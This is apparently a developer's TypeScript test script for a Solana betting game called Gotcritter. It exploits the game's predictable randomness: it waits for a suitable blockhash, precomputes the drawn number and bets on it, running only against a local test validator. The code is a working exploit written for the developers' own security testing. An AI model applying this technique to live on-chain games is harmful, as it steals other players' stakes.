import {
  Connection,
  Transaction,
  PublicKey,
  Keypair,
  TransactionSignature,
  LAMPORTS_PER_SOL,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import * as anchor from "@coral-xyz/anchor";
import { Program, AnchorProvider } from "@coral-xyz/anchor";
import GotcritterIDL from "../anchor/target/idl/gotcritter.json";
import type { Gotcritter } from "../anchor/target/types/gotcritter";
import { sha256 } from "@noble/hashes/sha256";
import { bs58 } from "@coral-xyz/anchor/dist/cjs/utils/bytes";
import BN from "bn.js";

/**
 * This script is used to try to cheat the game by predicting the drawn number and betting precisely on it when the previous bets combined hash has the last 2 characters the same
 * It did work! That's why we are changing the algorithm to avoid this.
 * The next algorithm will not allow the bet on the finishing blockhash, instead it will close the betting period and reward a small prize to this bettor.
 *
 * to run this test:
 * npx esrun scripts/try-to-cheat.ts
 */

async function main() {
  // Conectar à rede local
  const connection = new Connection("http://localhost:8899", "confirmed");

  // Criar uma nova carteira para teste
  const pagador = Keypair.generate();
  console.log("Endereço da carteira:", pagador.publicKey.toBase58());

  // Configurar o provider Anchor com o pagador
  const provider = new AnchorProvider(
    connection,
    new anchor.Wallet(pagador),
    AnchorProvider.defaultOptions()
  );

  // Carregar o programa usando o IDL
  // const programId = new PublicKey(GotcritterIDL.address);
  const program = new Program(GotcritterIDL as Gotcritter, provider);

  // Solicitar airdrop
  await solicitarAirdrop(connection, pagador.publicKey, 2000);

  try {
    const gamePublicKey =
      await encontrarJogoPublicoEmAndamentoComMaiorValorTotal(program);
    console.log("Jogo selecionado:", gamePublicKey.toBase58());

    const resultado = await observarEEnviarTransacao(
      connection,
      program,
      gamePublicKey,
      pagador
    );
    console.log("Transação finalizada com sucesso:", resultado);
  } catch (erro) {
    console.error(
      "Erro na execução principal:",
      erro instanceof Error ? erro.message : String(erro)
    );
  }
}

async function solicitarAirdrop(
  connection: Connection,
  carteira: PublicKey,
  quantidadeSOL: number
): Promise<void> {
  const assinatura = await connection.requestAirdrop(
    carteira,
    quantidadeSOL * LAMPORTS_PER_SOL
  );
  await connection.confirmTransaction(assinatura);
  console.log(`Airdrop de ${quantidadeSOL} SOL solicitado e confirmado.`);
}

async function encontrarJogoPublicoEmAndamentoComMaiorValorTotal(
  program: Program<Gotcritter>
): Promise<PublicKey> {
  const jogos = await program.account.game.all([
    {
      memcmp: {
        offset: 8 + 32, // 8 bytes para o discriminador + 32 bytes para o creator
        bytes: anchor.utils.bytes.bs58.encode(Buffer.from([1])), // true para open
      },
    },
    {
      memcmp: {
        offset: 8 + 32 + 1 + 32 * 10 + 8 + 8 + 32 + 32 + 200, // offset para betting_period_ended
        bytes: anchor.utils.bytes.bs58.encode(Buffer.from([0])), // false para betting_period_ended
      },
    },
  ]);

  let jogoComMaiorValor = null;

  for (const jogo of jogos) {
    // TODO: check if is possible the 1000 blocks has passed
    if (
      jogo.account.open &&
      !jogo.account.bettingPeriodEnded &&
      (!jogoComMaiorValor ||
        jogo.account.totalValue.gt(jogoComMaiorValor.account.totalValue))
    ) {
      jogoComMaiorValor = jogo;
    }
  }

  if (!jogoComMaiorValor) {
    throw new Error("Nenhum jogo aberto encontrado");
  }

  return jogoComMaiorValor.publicKey;
}

async function observarEEnviarTransacao(
  connection: Connection,
  program: Program<Gotcritter>,
  game: PublicKey,
  pagador: Keypair
): Promise<TransactionSignature> {
  while (true) {
    try {
      const { blockhash: blockhashAsBase58 } =
        await connection.getLatestBlockhash();

      const blockhash = Buffer.from(bs58.decode(blockhashAsBase58)).toString(
        "hex"
      );

      if (temCaracteresRepetidos(blockhash)) {
        console.log(
          `Blockhash encontrado com caracteres repetidos: ${blockhashAsBase58} \n${blockhash}`
        );

        const gameAccount = await program.account.game.fetch(game);
        const betNumber = calcularBetNumber(
          gameAccount.combinedHash,
          blockhash
        );
        const instrucao = await criarInstrucaoPlaceBet(
          program,
          game,
          pagador.publicKey,
          betNumber
        );

        const assinatura = await enviarTransacao(
          connection,
          instrucao,
          blockhash,
          pagador
        );

        console.log(`Aposta feita com sucesso no número ${betNumber}`);
        console.log("Transação bem-sucedida:", assinatura);
        return assinatura;
      }
    } catch (erro) {
      console.error(
        "Erro ao observar ou enviar transação:",
        erro instanceof Error ? erro.message : String(erro)
      );
    }

    await new Promise((resolve) => setTimeout(resolve, 200));
  }
}

function temCaracteresRepetidos(blockhash: string): boolean {
  return blockhash.slice(-2)[0] === blockhash.slice(-2)[1];
}

function calcularBetNumber(combinedHash: number[], blockhash: string): number {
  const newCombinedHash = calcularNovoCombinedHash(combinedHash, blockhash);
  console.log("newCombinedHash", newCombinedHash);
  return calcularSomaBigInt(newCombinedHash);
}

function calcularNovoCombinedHash(
  combinedHash: number[],
  blockhash: string
): Uint8Array {
  console.log("calcularNovoCombinedHash", { combinedHash, blockhash });
  const blockhashArray = Buffer.from(blockhash, "hex");
  const combinedHashCompleto = new Uint8Array(
    combinedHash.length + blockhashArray.length
  );
  combinedHashCompleto.set(combinedHash);
  combinedHashCompleto.set(blockhashArray, combinedHash.length);
  return sha256(combinedHashCompleto);
}

function calcularSomaBigInt(hash: Uint8Array): number {
  let sum = BigInt(0);
  for (let i = 0; i < hash.length; i += 8) {
    const chunk = hash.slice(i, i + 8);
    const value = new DataView(chunk.buffer).getBigUint64(0, true);
    sum = (sum + value) & BigInt("0xffffffffffffffff"); // Simula o wrapping_add do Rust
  }
  return Number((sum % BigInt(25)) + BigInt(1));
}

async function criarInstrucaoPlaceBet(
  program: Program<Gotcritter>,
  game: PublicKey,
  bettor: PublicKey,
  betNumber: number
): Promise<anchor.web3.TransactionInstruction> {
  const betValue = new BN(LAMPORTS_PER_SOL); // new BN(0.001).mul(new BN(LAMPORTS_PER_SOL));
  return program.methods
    .placeBet(betNumber, betValue)
    .accounts({
      game: game,
      bettor: bettor,
    })
    .instruction();
}

async function enviarTransacao(
  connection: Connection,
  instrucao: anchor.web3.TransactionInstruction,
  blockhash: string,
  pagador: Keypair
): Promise<TransactionSignature> {
  const transaction = new Transaction().add(instrucao);
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = pagador.publicKey;

  const slotAtual = await connection.getSlot();
  console.log("Slot atual:", slotAtual);
  transaction.lastValidBlockHeight = slotAtual + 1;

  return sendAndConfirmTransaction(connection, transaction, [pagador], {
    commitment: "confirmed",
    maxRetries: 1,
  });
}

main();
